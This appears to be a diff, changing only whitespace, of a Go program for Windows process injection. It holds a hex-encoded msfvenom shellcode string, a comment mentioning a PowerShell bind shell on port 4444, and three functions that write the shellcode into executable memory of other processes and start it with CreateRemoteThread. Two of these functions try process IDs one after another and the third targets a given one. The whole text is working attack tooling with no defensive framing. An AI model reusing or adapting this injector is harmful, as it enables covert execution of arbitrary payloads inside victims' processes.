@@ -15,7 +15,7 @@ import (
 // example Cmd running calc
 // msfvenom --format hex -p windows/x64/exec CMD="cmd /c calc.exe"
 const (
-    bind_shell64 = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d64202f632063616c632e65786500"
+  bind_shell64 = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d64202f632063616c632e65786500"
 )
 
 // PowerShell BindShell on port 4444
@@ -45,95 +45,95 @@ func main() {
 }
 
 const (
-	winMemCommit        = 0x1000
-	winMemReserve       = 0x2000
-	winAllocMemAsRW     = 0x40
-	winProcCreateThread = 0x0002
-	winProcQueryInfo    = 0x0400
-	winProcMemOp        = 0x0008
-	winProcMemWrite     = 0x0020
-	winProcMemRead      = 0x0010
-	zeroValue           = 0
+  winMemCommit        = 0x1000
+  winMemReserve       = 0x2000
+  winAllocMemAsRW     = 0x40
+  winProcCreateThread = 0x0002
+  winProcQueryInfo    = 0x0400
+  winProcMemOp        = 0x0008
+  winProcMemWrite     = 0x0020
+  winProcMemRead      = 0x0010
+  zeroValue           = 0
 )
 
 var (
-	k32                   = syscall.NewLazyDLL("kernel32.dll")
-	virtualAlloc          = k32.NewProc("VirtualAlloc")
-	winOpenProc           = k32.NewProc("OpenProcess")
-	winWriteProcMem       = k32.NewProc("WriteProcessMemory")
-	winMemAllocEx         = k32.NewProc("VirtualAllocEx")
-	winCreateRemoteThread = k32.NewProc("CreateRemoteThread")
+  k32                   = syscall.NewLazyDLL("kernel32.dll")
+  virtualAlloc          = k32.NewProc("VirtualAlloc")
+  winOpenProc           = k32.NewProc("OpenProcess")
+  winWriteProcMem       = k32.NewProc("WriteProcessMemory")
+  winMemAllocEx         = k32.NewProc("VirtualAllocEx")
+  winCreateRemoteThread = k32.NewProc("CreateRemoteThread")
 )
 
 func allocate(shellcode uintptr) uintptr {
-	addr, _, _ := virtualAlloc.Call(0, shellcode, winMemReserve|winMemCommit, winAllocMemAsRW)
-	if addr == 0 {
-		os.Exit(0)
-	}
-	return addr
+  addr, _, _ := virtualAlloc.Call(0, shellcode, winMemReserve|winMemCommit, winAllocMemAsRW)
+  if addr == 0 {
+    os.Exit(0)
+  }
+  return addr
 }
 
 func FirstPIDInject(code string) {
-	shellcode, err := hex.DecodeString(code)
-	if err != nil {
-		return
-	}
+  shellcode, err := hex.DecodeString(code)
+  if err != nil {
+    return
+  }
 
-	shellcodeAddr := allocate(uintptr(len(shellcode)))
-	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
-	for shellcodeIdx, shellcodeByte := range shellcode {
-		AddrPtr[shellcodeIdx] = shellcodeByte
-	}
+  shellcodeAddr := allocate(uintptr(len(shellcode)))
+  AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
+  for shellcodeIdx, shellcodeByte := range shellcode {
+    AddrPtr[shellcodeIdx] = shellcodeByte
+  }
 
-	for i := 100; i < 99999; i++ {
-		remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
-		remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
-		winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
-		status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
-		if status != 0 {
-			break
-		}
-	}
+  for i := 100; i < 99999; i++ {
+    remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
+    remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
+    winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
+    status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
+    if status != 0 {
+      break
+    }
+  }
 }
 
 func HigherPIDInject(code string) {
-	shellcode, err := hex.DecodeString(code)
-	if err != nil {
-		return
-	}
+  shellcode, err := hex.DecodeString(code)
+  if err != nil {
+    return
+  }
 
-	shellcodeAddr := allocate(uintptr(len(shellcode)))
-	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
-	for shellcodeIdx, shellcodeByte := range shellcode {
-		AddrPtr[shellcodeIdx] = shellcodeByte
-	}
+  shellcodeAddr := allocate(uintptr(len(shellcode)))
+  AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
+  for shellcodeIdx, shellcodeByte := range shellcode {
+    AddrPtr[shellcodeIdx] = shellcodeByte
+  }
 
-	for i := 4000; i < 99999; i++ {
-		remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
-		remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
-		winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
-		status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
-		if status != 0 {
-			break
-		}
-	}
+  for i := 4000; i < 99999; i++ {
+    remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(i))
+    remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
+    winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
+    status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
+    if status != 0 {
+      break
+    }
+  }
 }
 
 func SpecificPIDInject(code string, pid2 int) {
-	shellcode, err := hex.DecodeString(code)
-	if err != nil {
-		return
-	}
+  shellcode, err := hex.DecodeString(code)
+  if err != nil {
+    return
+  }
 
-	shellcodeAddr := allocate(uintptr(len(shellcode)))
-	AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
-	for shellcodeIdx, shellcodeByte := range shellcode {
-		AddrPtr[shellcodeIdx] = shellcodeByte
-	}
+  shellcodeAddr := allocate(uintptr(len(shellcode)))
+  AddrPtr := (*[990000]byte)(unsafe.Pointer(shellcodeAddr))
+  for shellcodeIdx, shellcodeByte := range shellcode {
+    AddrPtr[shellcodeIdx] = shellcodeByte
+  }
 
-	remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(pid2))
-	remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
-	winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
-	status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
+  remoteProcess, _, _ := winOpenProc.Call(winProcCreateThread|winProcQueryInfo|winProcMemOp|winProcMemWrite|winProcMemRead, uintptr(zeroValue), uintptr(pid2))
+  remoteProcessMem, _, _ := winMemAllocEx.Call(remoteProcess, uintptr(zeroValue), uintptr(len(shellcode)), winMemReserve|winMemCommit, winAllocMemAsRW)
+  winWriteProcMem.Call(remoteProcess, remoteProcessMem, shellcodeAddr, uintptr(len(shellcode)), uintptr(zeroValue))
+  status, _, _ := winCreateRemoteThread.Call(remoteProcess, uintptr(zeroValue), 0, remoteProcessMem, uintptr(zeroValue), 0, uintptr(zeroValue))
   fmt.Println(status)
 }
